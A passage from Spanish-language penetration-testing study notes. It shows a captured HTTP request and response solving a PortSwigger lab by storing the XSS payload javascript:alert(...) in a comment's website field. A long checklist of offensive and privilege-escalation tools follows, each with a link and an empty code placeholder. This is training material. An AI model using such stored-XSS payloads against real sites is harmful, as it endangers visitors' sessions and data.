                            <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                        </svg>
                            </a>
                            <a href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded'>
                                Continue learning 
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                    </div>
                </section>
            </div>
            <div theme="blog">
                <section class="maincontainer">
                    <div class="container is-page">
                        <header class="navigation-header">
                            <section class="top-links">
                                <a href=/>Home</a><p>|</p>
                            </section>
                        </header>
                        <header class="notification-header">
                        </header>
                        <h1>Thank you for your comment!</h1>
                        <p>Your comment has been submitted.</p>
                        <div class="is-linkback">
                            <a href="/post?postId=6">Back to blog</a>
                        </div>
                    </div>
                </section>
                <div class="footer-wrapper">
                </div>
            </div>
        </body>
    </html>





    -------------




    REQQUEST CON EL PAYLOAD FUNCIONANDO (javascript:alert('P4IM0N-XSS')):


    POST /post/comment HTTP/2
    Host: 0a18009404d9f89a83c33ccd00040081.web-security-academy.net
    Cookie: session=wIYdf7PqerZCFYTDC3gD2AoGbBXyuRp0
    Content-Length: 154
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Upgrade-Insecure-Requests: 1
    Origin: https://0a18009404d9f89a83c33ccd00040081.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a18009404d9f89a83c33ccd00040081.web-security-academy.net/post?postId=6
    Accept-Encoding: gzip, deflate, br
    Accept-Language: es-419,es;q=0.9,en;q=0.8

    csrf=2UG950bIoDRrvtRmAELfwdnkH9DxybNV&postId=6&comment=TE+HACKIE+1&name=PAIMON&email=P4IM0N%40hotmail.com&website=javascript%3Aalert%28%27P4IM0N-XSS%27%29







    RESPONSE CON EL PAYLOAD FUNCIONANDO (javascript:alert('P4IM0N-XSS')):



    HTTP/2 200 OK
    Content-Type: text/html; charset=utf-8
    X-Frame-Options: SAMEORIGIN
    Content-Length: 5924

    <!DOCTYPE html>
    <html>
        <head>
            <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <title>Stored XSS into anchor href attribute with double quotes HTML-encoded</title>
        </head>
        <body>
            <script src="/resources/labheader/js/labHeader.js"></script>
            <div id="academyLabHeader">
                <section class='academyLabBanner is-solved'>
                    <div class=container>
                        <div class=logo></div>
                            <div class=title-container>
                                <h2>Stored XSS into anchor <code>href</code> attribute with double quotes HTML-encoded</h2>
                                <a class=link-back href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded'>
                                    Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                    <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                        <g>
                                            <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                            <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                        </g>
                                    </svg>
                                </a>
                            </div>
                            <div class='widgetcontainer-lab-status is-solved'>
                                <span>LAB</span>
                                <p>Solved</p>
                                <span class=lab-status-icon></span>
                            </div>
                        </div>
                    </div>
                </section>
                <section id=notification-labsolved class=notification-labsolved>
                    <div class=container>
                        <h4>Congratulations, you solved the lab!</h4>
                        <div>
                            <span>
                                Share your skills!
                            </span>
                            <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aStored+XSS+into+anchor+href+attribute+with+double+quotes+HTML-encoded%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-href-attribute-double-quotes-html-encoded&related=WebSecAcademy,Burp_Suite'>
                        <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                            <title>twitter-button</title>
                            <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                        </svg>
                            </a>
                            <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fcross-site-scripting%2fcontexts%2flab-href-attribute-double-quotes-html-encoded'>
                        <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                            <title>linkedin-button</title>
                            <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                        </svg>
                            </a>
                            <a href='https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded'>
                                Continue learning 
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                    </div>
                </section>
            </div>
            <div theme="blog">
                <section class="maincontainer">
                    <div class="container is-page">
                        <header class="navigation-header">
                            <section class="top-links">
                                <a href=/>Home</a><p>|</p>
                            </section>
                        </header>
                        <header class="notification-header">
                        </header>
                        <h1>Thank you for your comment!</h1>
                        <p>Your comment has been submitted.</p>
                        <div class="is-linkback">
                            <a href="/post?postId=6">Back to blog</a>
                        </div>
                    </div>
                </section>
                <div class="footer-wrapper">
                </div>
            </div>
        </body>
    </html>
    ```

    * CONCLUSION: CONSTATAMOS QUE EL HREF DEL NOMBRE DEL USUARIO QUE COMENTA ESTA DENTRO DE UINA ETIQUETA A , Y DENTRO DEL DICHO HREF SIMPLEMETE VEMOS QUE SE CARGABA EL PARAMETRO WEB SITE QUE INGRESABA EL SUSARIO Y VIMOS ESTA PUERTA DE ENTRADA PARA CARGAR NUESTRO PAYLOAD DIRECTAMENTE CON COMILLAS SIMPLES Y LOGARA LA INYECCION DEL XSS ALMACENADO SE TENZO.
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC👈 --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] VELO👈 --------------------------------->[https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WEB2ATTACK👈 --------------------------------->[https://github.com/santatic/web2attack](https://github.com/santatic/web2attack)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMMIX👈 --------------------------------->[https://www.kali.org/tools/commix/](https://www.kali.org/tools/commix/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WEBSPLOIT👈 --------------------------------->[https://github.com/The404Hacking/websploit](https://github.com/The404Hacking/websploit)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BEEF FRAMEWORK EXPLOTACION👈--------------------------------->[https://www.kali.org/tools/beef-xss/](https://www.kali.org/tools/beef-xss/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔⛔

<details>

<summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>

**ESCALADA DE PRIVILEGIOS WINDOWS**

*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] POWERUP👈 --------------------------------->[https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] MIMIKATZ👈 --------------------------------->[https://www.kali.org/tools/mimikatz/ ](https://www.kali.org/tools/mimikatz/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/mimikatz-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ROTTENPOTATO👈 --------------------------------->[https://github.com/breenmachine/RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WINDOWS EXPLOITS SUGGESTER👈 --------------------------------->[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ACCESSCHK👈 --------------------------------->[https://github.com/ankh2054/windows-pentest](https://github.com/ankh2054/windows-pentest)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PSEXEC👈 --------------------------------->[https://learn.microsoft.com/en-us/sysinternals/downloads/psexec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WINPEAS👈 --------------------------------->[https://www.kali.org/tools/peass-ng/ ](https://www.kali.org/tools/peass-ng/)--->[https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] BLOODHOUND --------------------------------->[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] CRACKMAPEXEC --------------------------------->[https://www.kali.org/tools/crackmapexec/](https://www.kali.org/tools/crackmapexec/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] EMPIRE POWERSHELL Y LINUX👈 --------------------------------->[https://www.kali.org/tools/powershell-empire/ ](https://www.kali.org/tools/powershell-empire/)-->[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] RESPONDER👈 --------------------------------->[https://www.kali.org/tools/responder/ ](https://www.kali.org/tools/responder/)-->[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LOLBAS👈 --------------------------------->[https://lolbas-project.github.io/#](https://lolbas-project.github.io)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WADCOMS comandos👈 --------------------------------->[https://wadcoms.github.io/](https://wadcoms.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HIJACKLIBS DLL👈 --------------------------------->[https://hijacklibs.net/](https://hijacklibs.net/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PRINTSPOOFER👈 --------------------------------->[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ROGUEWINRM👈 --------------------------------->[https://github.com/antonioCoco/RogueWinRM](https://github.com/antonioCoco/RogueWinRM)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] WINDOWSPRIVESC metodos👈 --------------------------------->[https://github.com/debiantano/WindowsPrivesc](https://github.com/debiantano/WindowsPrivesc)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] PRIV-ESCALATION metodos👈 --------------------------------->[https://github.com/KevinLiebergen/priv-escalation](https://github.com/KevinLiebergen/priv-escalation)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] FILESEC GTFO win y linux👈 --------------------------------->[https://filesec.io/](https://filesec.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] HACKTRICKS👈 --------------------------------->[https://book.hacktricks.xyz/v/es/welcome/readme](https://book.hacktricks.xyz/v/es/welcome/readme)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] POWERSPLOIT👈 --------------------------------->[https://www.kali.org/tools/powersploit/](https://www.kali.org/tools/powersploit/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] EVIL-WINRM👈 --------------------------------->[https://www.kali.org/tools/evil-winrm/](https://www.kali.org/tools/evil-winrm/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:

***

***

</details>

☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️☣️

<details>

<summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>

**ESCALADA DE PRIVILEGIOS LINUX**

*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SOCAT👈 --------------------------------->[https://www.kali.org/tools/socat/](https://www.kali.org/tools/socat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/socat-conecciones.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LaZagne👈 --------------------------------->[https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/lazagne-obtencion-de-credenciales-y-posibles-escaladas-de-privilegios-para-windows-y-linux.md)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GTFObins👈 --------------------------------->[https://gtfobins.github.io/](https://gtfobins.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GTFObins👈 --------------------------------->[https://gtfobins.github.io/](https://gtfobins.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] GTFObins👈 --------------------------------->[https://gtfobins.github.io/](https://gtfobins.github.io/)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINUX KERNEL CVEs👈 --------------------------------->[https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINENUM👈 --------------------------------->[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] LINPEAS👈 --------------------------------->[https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

    ```python
    # Espacio para fragmento de código Python -->
    ```

    * CONCLUSION:
*   [ ] ENUMERACION SMART LINUX👈 --------------------------------->[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

